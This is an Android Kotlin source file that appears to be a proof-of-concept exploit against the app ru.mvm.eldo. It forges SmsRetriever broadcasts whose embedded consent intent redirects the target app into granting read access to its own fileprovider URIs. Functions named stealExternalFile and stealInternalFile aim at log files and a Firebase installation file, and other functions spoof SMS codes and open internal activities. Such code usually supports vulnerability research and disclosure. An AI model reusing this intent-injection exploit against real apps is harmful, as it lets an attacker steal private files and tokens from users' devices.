package com.example.mvde028_intent_injection_poc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Bundle
import android.os.Environment.getExternalStorageDirectory
import android.view.View
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContract
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.google.android.gms.common.api.CommonStatusCodes
import com.google.android.gms.common.api.Status

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    fun stealExternalFile(view: View) {
        val extra = Intent().apply {
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            setClassName(packageName, "com.example.mvde028_intent_injection_poc.LeakActivity")
            data = Uri.parse("content://ru.mvm.eldo.fileprovider/external_files/Android/data/ru.mvm.eldo/cache/logs/log_1.13.20_0.txt")
        }.also{
            sendSmsReceived(it)
        }
    }

    fun stealInternalFile(view: View) {
        val extra = Intent().apply {
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            setClassName(packageName, "com.example.mvde028_intent_injection_poc.LeakActivity")
            data = Uri.parse("content://ru.mvm.eldo.im.threads.fileprovider/internal_files/PersistedInstallation.W0RFRkFVTFRd+MTo4NTMxODEwNzk5OTg6YW5kcm9pZDoyZDcyMWQ2YjNkNTRkNWMyNmJkOWVm.json/")
        }.also{
            sendSmsReceived(it)
        }
    }

    fun registerSmsVerificationReceiver(view: View) {
        val intentFilter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
        registerReceiver(smsVerificationReceiver, intentFilter)
    }

    fun unregisterSmsVerificationReceiver(view: View) {
        unregisterReceiver(smsVerificationReceiver)
    }

    fun writeToFile(view: View) {
        getFilesDir().absolutePath.also {
            Toast.makeText(this, it, Toast.LENGTH_LONG).show()
        }
    }

    fun spoofSmsCode(view: View) {
        Intent().apply{
            setClassName("com.example.mvde028_intent_injection_poc", "com.example.mvde028_intent_injection_poc.SecondActivity")
            // setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.splash.activity.SplashActivity")
            // putExtra("com.google.android.gms.auth.api.phone.EXTRA_SMS_MESSAGE", "You're pwned 6666")
            putExtra("ZALUPA", "PENIS")
        }.also {
            sendSmsReceived(it)
        }
    }

    fun startMainActivity(view: View) {
        Intent().apply {
            setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.main.MainActivity")
        }.also {
            sendSmsReceived(it)
        }
    }

    fun startRegionActivity(view: View) {
        Intent().apply {
            setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.region.activity.RegionActivity")
        }.also {
            sendSmsReceived(it)
        }
    }

    fun sendSmsReceived(extra: Intent) {
        Intent().apply{
            action = SmsRetriever.SMS_RETRIEVED_ACTION
            putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, extra)
            putExtra(SmsRetriever.EXTRA_STATUS, Status(CommonStatusCodes.SUCCESS))
        }.also {
            sendBroadcast(it)
        }

        // intent.setClassName("com.example.mvde028_intent_injection_poc", "com.example.mvde028_intent_injection_poc.SecondActivity")
        // intent.setClassName("ru.mvm.eldo", "ru.mvm.eldo.presentation.splash.activity.SplashActivity")

        // intent.action = "com.example.mvde028_intent_injection_poc.ZALUPA"

        // intent.putExtra("com.google.android.gms.auth.api.phone.EXTRA_STATUS", 15) // TIMEOUT
        // intent.putExtra("ZALUPA", "PENIS")
    }
    
    private val smsRequestLauncher = registerForActivityResult(SmsConsentContract()) {
        it?.let { sms -> smsListener(sms) }
    }

    fun smsListener(sms: String) : Unit {
        Toast.makeText(this, sms, Toast.LENGTH_LONG).show()
    }

    val smsVerificationReceiver = object : BroadcastReceiver() {

        override fun onReceive(context: Context, intent: Intent) {
            if (SmsRetriever.SMS_RETRIEVED_ACTION == intent.action) {
                val extras = intent.extras
                var smsRetrieverStatus = extras?.get(SmsRetriever.EXTRA_STATUS) as Status

                when (smsRetrieverStatus.statusCode) {
                    CommonStatusCodes.SUCCESS -> smsRequestLauncher.launch(
                        extras?.getParcelable(SmsRetriever.EXTRA_CONSENT_INTENT)
                    )
                }
            }
        }
    }

    private class SmsConsentContract : ActivityResultContract<Intent, String?>() {

        override fun createIntent(context: Context, input: Intent) = input

        override fun parseResult(resultCode: Int, intent: Intent?) =
            intent?.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
    }
}